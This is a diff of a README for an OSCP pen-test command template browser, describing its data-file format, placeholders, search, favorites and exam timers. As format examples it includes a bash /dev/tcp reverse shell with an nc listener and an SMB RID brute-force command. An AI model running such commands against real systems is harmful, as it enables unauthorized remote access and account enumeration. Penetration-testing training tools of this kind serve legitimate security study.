@@ -1,254 +1,166 @@
+
 # OSCP Command Generator
 
 A lightweight, offline-friendly command template browser + generator for
 OSCP/pen-test workflows.
 
--   Load commands from simple `.txt` files in `/data`
--   Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the
-    left sidebar
--   Search instantly without re-render flicker (DOM hide/show filtering)
--   Filter by **Credential**, **Non-credential**, **Priority**, and
-    **Favorites**
--   Copy full commands (or individual steps) with one click
--   Highlight placeholders, flags, operators, and `#comments` (but not
-    numbering like `#2`)
+- Load commands from simple `.txt` files in `/data`
+- Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the left sidebar
+- Search instantly without re-render flicker (DOM hide/show filtering)
+- Filter by **Credential**, **Non-credential**, **Priority**, and **Favorites**
+- Copy full commands (or individual steps) with one click
+- Highlight placeholders, flags, operators, and `#comments` (but not numbering like `#2`)
+- NEW: **Exam timer helpers** (20 / 40 / 90 mins) with **visual-only** alerts (no sound, no popups)
+- NEW: **Jump to category with hits** during global search
 
 ------------------------------------------------------------------------
 
-## 📁 Project Structure
+## Project Structure
 
-    oscp-command-generator/
-    ├─ index.html
-    ├─ css/
-    │  └─ style.css
-    ├─ js/
-    │  └─ (modular JS files)
-    ├─ data/
-    │  ├─ 01_Network_Enumeration.txt
-    │  ├─ 02_Web_Enumeration_and_attacks.txt
-    │  ├─ ...
-    │  └─ manifest.json
-    └─ README.md
-
-> If using `manifest.json`, directory listing is NOT required.\
-> If not using `manifest.json`, your server must allow directory listing
-> for `/data/`.
+oscp-command-generator/
+├─ index.html
+├─ css/
+│  └─ style.css
+├─ js/
+│  └─ (modular JS files)
+├─ data/
+│  ├─ 01_Network_Enumeration.txt
+│  ├─ 02_Web_Enumeration_and_attacks.txt
+│  ├─ ...
+│  └─ manifest.json
+└─ README.md
 
 ------------------------------------------------------------------------
 
-## 🚀 Getting Started
+## Getting Started
 
-### Option A --- Quick run (recommended)
+### Python
 
-Use a tiny local server so `fetch()` works.
-
-**Python**
-
-``` bash
 python -m http.server 8000
-```
 
 Open:
 
-    http://localhost:8000/
+http://localhost:8000/
 
-**Node (http-server)**
+### Node
 
-``` bash
 npx http-server -p 8000
-```
-
-### Option B --- VS Code Live Server
-
-1.  Install "Live Server" extension\
-2.  Right-click `index.html` → **Open with Live Server**
 
 ------------------------------------------------------------------------
 
-## 📄 Command File Format (`/data/*.txt`)
+## Command File Format
 
 Each non-empty line represents one command entry:
 
-    Title: command here
+Header: command with <tags> # comment (what this does / what to look for); kali-machine|target-machine
 
-### 🔺 Priority Commands
+Example:
 
-Prefix the line with `^`:
-
-    ^Nmap quick scan: nmap -sC -sV <target>
-
-If multiple lines share the same title, they are grouped into one card.
-
-If ANY line in that group is marked `^`, the entire card becomes
-Priority.
+RID Brute: nxc smb <target> -u '' -p '' --rid-brute # enumerate domain users/groups via RID brute-force; kali-machine
 
 ------------------------------------------------------------------------
 
-### 🔢 Multi-step Commands (Automatic Grouping)
+## Priority Commands
 
-If the **same title appears multiple times**, the app merges them into
-one card and treats them as multi-step:
+Prefix a command with ^
 
-    Reverse shell: nc -lvnp <kaliPort>
-    Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1
-
-Displayed as:
-
--   Step 1
--   Step 2
-
-Each step has its own copy button.
+^Nmap quick scan: nmap -sC -sV <target>
 
 ------------------------------------------------------------------------
 
-### 💬 Comments Inside Commands
+## Multi-step Commands
 
-You can append contextual comments using `#`:
+Repeated headers are grouped automatically:
 
-    Base64 transfer: base64 -d <filename2> > <filename1> #target-machine
-
--   `#target-machine` will be highlighted
--   `#2` (numbering) is NOT treated as a comment
+Reverse shell: nc -lvnp <kaliPort>
+Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1
 
 ------------------------------------------------------------------------
 
-## ➕ Adding a New Category
-
-1.  Create a new `.txt` file in `/data` Example:
-
-```{=html}
-<!-- -->
-```
-    14_Post_Exploitation.txt
-
-2.  Add commands using the required format.
-
-3.  Update `/data/manifest.json` (if used):
-
-``` json
-[
-  "01_Network_Enumeration",
-  "14_Post_Exploitation"
-]
-```
-
-> ⚠️ Do NOT include `.txt` in manifest entries.
-
-4.  Hard refresh browser (`Ctrl + Shift + R`).
-
-------------------------------------------------------------------------
-
-## ➖ Removing a Category
-
-1.  Delete the `.txt` file from `/data`
-2.  Remove its entry from `manifest.json`
-3.  Refresh browser
-
-------------------------------------------------------------------------
-
-## 🔄 Regenerating `manifest.json`
-
-If using `create.bat`, you can regenerate `manifest.json` automatically
-from existing `.txt` files:
-
-    create.bat
-
-------------------------------------------------------------------------
-
-## 🏷 Placeholders (Tags)
+## Placeholders
 
 Supported placeholders:
 
--   `<target>` Target IPv4
--   `<target6>` Target IPv6
--   `<port>` Target Port
--   `<kali>` Kali IPv4
--   `<kali6>` Kali IPv6
--   `<kaliPort>` Kali Port
--   `<user>` Username
--   `<password>` Password
--   `<domain>` Domain
--   `<dc-ip>` Domain Controller IP
--   `<ntlm>` NTLM Hash
--   `<filename1>`, `<filename2>`
--   `<wordlist1>`, `<wordlist2>`
-
-Open the **Help (?) button** to view all tags and click to focus their
-input field.
-
-------------------------------------------------------------------------
-
-## 🔍 Filters
-
-Buttons appear in this order:
-
-1.  **Credential**
-2.  **Non-credential**
-3.  **Priority**
-4.  **Favorites**
-
-### Credential vs Non-credential
-
--   **Credential** = contains BOTH `<user>` and `<password>`
--   **Non-credential** = everything else
--   They are mutually exclusive
--   If neither selected → show all
+<target>
+<target6>
+<port>
+<kali>
+<kali6>
+<kaliPort>
+<user>
+<password>
+<domain>
+<dc-ip>
+<ntlm>
+<filename1>
+<filename2>
+<wordlist1>
+<wordlist2>
 
 ------------------------------------------------------------------------
 
-## ⭐ Favorites
+## Search
 
--   Click `☆ / ★` to favorite
--   Stored in `localStorage`
--   Filter using the Favorites button
+Local search filters commands inside the current category.
 
-------------------------------------------------------------------------
+Global search lists matching categories under **Found in:**
 
-## 🧪 Exam Controls
-
-### Block Copy
-
-When enabled: - Copy buttons are disabled if required placeholders are
-empty
-
-### Remember Non-sensitive Inputs
-
-When enabled: - Stores IPs, ports, filenames, wordlists in
-`localStorage` - Passwords are NOT stored
+Clicking a category jumps directly to that category while keeping the search term.
 
 ------------------------------------------------------------------------
 
-## ⌨️ Keyboard Shortcuts
+## Favorites
 
--   `/` → Focus search
--   `j` / `k` → Move selection
--   `c` → Copy selected card
--   `Ctrl + + / - / 0` → Font scaling
--   `Esc` → Close Help panel
-
-> No hotkeys for favorite/priority to avoid typing conflicts.
+Click ☆ / ★ to favorite commands.
+Favorites are stored in localStorage.
 
 ------------------------------------------------------------------------
 
-## ⚙️ Notes / Requirements
+## Exam Timer Helpers
 
--   Must be served over `http://`
--   Fully static (no backend)
--   Works offline once loaded
--   Safe for GitHub Pages hosting
+Toolbar timers:
+
+20 / 40 / 90 minute timers
+
+Stop button cancels the timer.
+
+Alerts are visual only:
+
+- flashing red timer
+- flashing browser tab attention
+
+Active timer button style:
+
+- dark red tint
+- bold red outline
+
+Pressing Stop resets the button style.
 
 ------------------------------------------------------------------------
 
-## ✅ Unit Tests (core helpers)
+## Exam Controls
 
-From the project root:
+Block Copy:
+Prevents copying commands if required tags are missing.
 
-```bash
-node tests/run-tests.mjs
-```
+Remember Non-sensitive Inputs:
+Stores IPs, ports, filenames and wordlists in localStorage.
+Passwords are never stored.
 
 ------------------------------------------------------------------------
 
-## 📜 License
+## Keyboard Shortcuts
 
-MIT (add `LICENSE` file to project root)
+/ → focus search
+j / k → move selection
+c → copy selected command
+Ctrl + + / - / 0 → adjust font size
+Esc → close help
+
+------------------------------------------------------------------------
+
+## Notes
+
+- Must be served via HTTP
+- Fully static project
+- Works offline once loaded
